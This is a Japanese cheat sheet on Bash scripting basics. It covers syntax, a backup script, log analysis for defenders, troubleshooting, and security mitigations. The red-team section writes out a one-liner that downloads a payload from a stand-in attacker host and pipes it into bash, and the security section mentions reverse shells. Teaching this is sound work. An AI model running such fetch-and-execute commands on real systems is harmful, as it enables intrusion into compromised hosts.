# シェルスクリプティング基礎 (Bash)

## 概要

シェルスクリプトは、一連のコマンドを記述したテキストファイルで、シェルのインタプリタ（主に`bash`）によって上から順に実行されます。定型的な作業の自動化、複雑なコマンドの組み合わせの再利用、簡単なツールの作成など、Linuxシステム管理において不可欠な技術です。このチートシートでは、`bash` スクリプトの基本的な構成要素と概念を解説します。

(出自: `bash` シェルの基本機能)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- |:---|
| **Python/Perl** | これらはより高機能な汎用プログラミング言語です。複雑なデータ構造やアルゴリズム、豊富な外部ライブラリを扱う場合はPythonなどが適しています。シェルスクリプトは、既存のコマンドを連携させて処理を自動化するのが得意です。 | Python (複雑な処理) |
| **Ansible Playbook**| 構成管理に特化しており、冪等性が保証されています。サーバーのセットアップや構成変更にはAnsibleが適しています。シェルスクリプトは、より汎用的なタスク自動化に使います。 | Ansible (構成管理) |

## 📜 スクリプトの基本構造と実行方法

### 1. Shebang (シェバン)

スクリプトの**一番最初の行**に記述し、どのインタプリタでこのファイルを実行するかをOSに伝えます。

```bash
#!/bin/bash
```

### 2\. コメント

`#` で始まる行はコメントとして扱われ、実行されません。

```bash
# このスクリプトはサーバーをバックアップします
```

### 3\. コマンド

`ls`, `cp`, `echo` など、普段ターミナルで実行するコマンドをそのまま記述します。

```bash
echo "Starting backup..."
```

### 4\. 実行権限と実行方法

スクリプトを実行するには、まず実行権限を付与する必要があります。

```bash
# 実行権限を付与
chmod +x my_script.sh

# スクリプトを実行 (カレントディレクトリにある場合)
./my_script.sh
```

## 主要な構文要素

| 要素 | 説明 |
| :--- | :--- |
| **変数** | ⭐ **定義**: `VAR="value"` ( `=` の前後にスペースを入れない)<br> ⭐ **参照**: `$VAR` または `${VAR}` |
| **引数** | `$0`: スクリプト名, `$1`: 第1引数, `$#`: 引数の数, `"$@"`: 全引数 |
| **終了ステータス**| ⭐ `$?`: 直前に実行したコマンドの終了ステータス。`0` が成功、それ以外はエラー。 |
| **条件分岐** | ⭐ `if [ ... ]; then ... fi` |
| **ループ** | ⭐ `for item in ...; do ... done`<br>`while read line; do ... done` |
| **関数** | `function name() { ... }` または `name() { ... }` |

## よく使われるオプション組み合わせと業務シナリオ

### 1\. インフラ構築・運用視点

* **タスク**: 特定のディレクトリをタイムスタンプ付きでバックアップするスクリプト。
* **組み合わせ**: 変数、引数、`if`文、`tar`コマンド
* **解説**: スクリプトに引数としてバックアップ対象ディレクトリを渡し、存在チェックを行った上で、日付を含むファイル名で `tar` を実行します。
* **例 (`backup.sh`)**:

    ```bash
    #!/bin/bash
    set -e # 失敗したら即座に終了

    TARGET_DIR="$1"
    BACKUP_DIR="/mnt/backups"
    TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
    FILENAME="backup-${TIMESTAMP}.tar.gz"

    if [ -z "$TARGET_DIR" ]; then
      echo "Error: Target directory not specified." >&2
      exit 1
    fi

    echo "Backing up ${TARGET_DIR} to ${BACKUP_DIR}/${FILENAME}..."
    tar -czf "${BACKUP_DIR}/${FILENAME}" "${TARGET_DIR}"
    echo "Backup complete."
    ```

### 2\. ブルーチーム視点

* **タスク**: ログファイルから不審なIPアドレスを抽出し、アクセス回数順にリストアップする。
* **組み合わせ**: パイプ、`grep`, `awk`, `sort`, `uniq`
* **解説**: 複数のテキスト処理コマンドをパイプで繋ぎ、大量のログから意味のある情報を抽出します。
* **例 (`analyze_log.sh`)**:

    ```bash
    #!/bin/bash
    LOG_FILE="$1"
    grep "Failed password" "$LOG_FILE" | awk '{print $11}' | sort | uniq -c | sort -nr
    ```

### 3\. レッドチーム視点

* **タスク**: 侵入したホスト上で、より高度なペイロードをダウンロードして実行する。
* **組み合わせ**: `curl`, `bash`
* **解説**: `curl`でダウンロードしたスクリプトをファイルに保存せず、直接 `bash` に渡して実行させます。
* **例 (ワンライナー)**:

    ```bash
    # curlでスクリプトをダウンロードし、bashで直接実行する
    curl -s [http://attacker.com/payload.sh](http://attacker.com/payload.sh) | bash
    ```

## エラーメッセージとトラブルシューティング

* 一般的なエラーは [Linux共通のトラブルシューティング](https://www.google.com/search?q=./troubleshooting_common_errors.md) を参照。

<!-- end list -->

1. **エラーメッセージ例 1**: `command not found`

      * **考えられる原因**: `PATH` が通っていないか、コマンドのタイプミス。スクリプト内で `cd` して相対パスが変わった可能性もあります。
      * **解決策**: コマンドをフルパスで指定するか、`PATH` を確認します。

2. **エラーメッセージ例 2**: `[: too many arguments`

      * **考えられる原因**: `if [ $VAR == "some string" ]` のように、スペースを含む可能性のある変数をダブルクォートで囲んでいません。
      * **解決策**: `if [ "$VAR" == "some string" ]` のように、必ず変数をダブルクォートで囲んでください。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: **コマンドインジェクション**。ユーザーからの入力を適切にエスケープ・検証せずにコマンドの引数として使うと、意図しないコマンドを実行されてしまいます。
* **悪用シナリオ**: 変数をダブルクォートで囲まないことによる意図しない挙動。

### GTFOBins / LOLBAS における利用例

* **機能**: **Shell**, **Reverse Shell**, **Fileless Execution**
* **解説**: `bash` 自体が環境寄生型バイナリ (LOLBAS) の代表格です。攻撃者は、Webサーバーの脆弱性を突いて `bash -c "..."` のような形でコマンドを実行させ、リバースシェルを確立します。
* **参照**: `https://gtfobins.github.io/gtfobins/bash/`

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: **変数は必ずダブルクォートで囲む (`"$VAR"`)**。`ShellCheck` ツールでスクリプトを静的解析する。
* **Detection (検知)**: `bash` プロセスからの不審なネットワーク接続や、Webサーバープロセス (`www-data`など) から `bash` が起動されるといった、通常ではありえない親子関係をEDRや`auditd`で監視する。

## 注意点・補足

* **`set -euo pipefail`**: スクリプトの冒頭にこの「非公式ストリクトモード」を記述すると、エラー発生時に即座に終了するなど、より安全な動作になります。
* **デバッグ**: `bash -x my_script.sh` で実行するか、スクリプト冒頭に `set -x` と記述すると、実行されるコマンドが一行ずつ表示され、デバッグに非常に役立ちます。
